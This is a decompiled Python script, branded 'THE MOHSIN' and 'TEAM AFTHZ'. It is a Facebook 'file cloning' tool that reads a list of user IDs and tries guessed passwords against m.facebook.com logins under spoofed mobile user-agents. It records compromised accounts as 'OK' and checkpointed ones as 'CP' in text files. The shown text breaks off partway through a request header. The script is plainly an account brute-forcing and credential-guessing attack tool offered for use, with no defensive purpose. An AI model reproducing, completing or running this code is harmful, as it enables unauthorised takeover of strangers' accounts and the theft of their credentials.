# Decompile by Mardis (Tools By Kapten-Kaizo)

# Time Succes decompile : 2022-05-15 10:54:19.688328

import os

try:

    import requests

except ImportError:

    print('\n [✓] installing requests !...\n')

    os.system('pip install requests')

try:

    import concurrent.futures

except ImportError:

    print('\n [✓] installing futures !...\n')

    os.system('pip install futures')

try:

    import bs4

except ImportError:

    print('\n [✓] installing bs4 !...\n')

    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib

from concurrent.futures import ThreadPoolExecutor as mohsinali

from datetime import datetime

from bs4 import BeautifulSoup

ct = datetime.now()

n = ct.month

bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']

try:

    if n < 0 or n > 12:

        exit()

    nTemp = n - 1

except ValueError:

    exit()

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

op = bulan[nTemp]

P = '\x1b[1;97m' # 

M = '\033[1;31m' # 

H = '\033[1;32m' # 

K = '\x1b[1;97m' # 

B = '\x1b[1;97m' # 

U = '\x1b[1;97m' # 

O = '\x1b[1;97m' # 

N = '\x1b[0m'    # 

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

data,data2={},{}

aman,cp,salah=0,0,0

ubahP,fuck,pwBaru=[],[],[]

ok = []

cp = []

id = []

user = []

loop = 0

url_lookup = "https://lookup-id.com/"

url_mb = "https://m.facebook.com"

url_ip = "https://www.httpbin.org/ip"

header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}

bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}

done = False

def jalan(z):

    for e in z + '\n':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.01)

logo="""      

      ######## \033[1;97m##     ## \033[1;92m########

         ##    \033[1;97m##     ## \033[1;92m##

         ##    \033[1;97m##     ## \033[1;92m##

         ##    \033[1;97m######### \033[1;92m######

         ##    \033[1;97m##     ## \033[1;92m##

         ##    \033[1;97m##     ## \033[1;92m##

         ##    \033[1;97m##     ## \033[1;92m######## \x1b[1;41m\x1b[1;97mTEAM AFTHZ \x1b[1;0m

 \033[1;97m _______  _____  _     _ _______ _____ __   _

 \033[1;97m |  |  | |     | |_____| |______   |   | \  |

 \033[1;97m |  |  | |_____| |     | ______| __|__ |  \_|

 

==================================================

           CODED BY : THE MOHSIN       

           WHATSAPP : +923426580799    

           FB PAGE  : FAWAD SOHAIL  

==================================================           

\x1b[0;91m\x1b[1;43m                  GANGSTAR BR4ND :)                 \x1b[0m"""

def hasil(OK,cp):

	if not len(OK) != 0:	    pass

	if len(cp) != 0:

	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mMOHSIN_OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mMOHSIN_CP.txt' % (H, P, str(len(cp))))

	    input("\x1b[1;97mPress enter to back FAWAD SOHAIL Menu ")

	    mohsin()

def mohsin():

    os.system('clear')

    print(logo)

    ipm = requests.get(url_ip).json()

    todz = ''

    IP = ipm['origin']

    print

    print(' [1] Start File Cloning')

    print(' [2] KNOW ABOUT [THE FAWAD]')

    print(' [E] exit ')

    print('')

    _mohsin___ = input(' [?] Choose option : ')

    if _mohsin___ in ('1', '01'):

        __xxx__().mohsinx(id)

    if _mohsin___ in ('2', '02'):

        create_file()

    if _mohsin___ in ('E', 'ee'):

        pass

class __xxx__:

    def __init__(self):

        self.id = []

    def mohsinx(self,id):

        os.system("clear")

        print(logo)

        self.cnt = input('Put File Name : ')

        self.id = open(self.cnt).read().splitlines()

        os.system('clear')

        print(logo)

        print("")

        ___worldwide___ = ('y')

        if ___worldwide___ in ('yes','Yes','Y', 'y'):

            self.__pler__()

        else:

            print(' [!] Choose Correct One');

            self.mohsinx(id)

    def __metode__(self, user, __chi__, cebok):

        global ok,cp,loop

        sys.stdout.write(f"\r \x1b[1;32m[THE MOHSIN] {loop} >o< {len(self.id)} [OK][{len(ok)}] >×< [CP][{len(cp)}] ")

        sys.stdout.flush()

        try:

            for pw in __chi__:

                pw = pw.lower()

                session=requests.Session()

                header = {

                    "Host":cebok,

                    "upgrade-insecure-requests":"1",

                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",

                    "accept":"text/html,applicatio
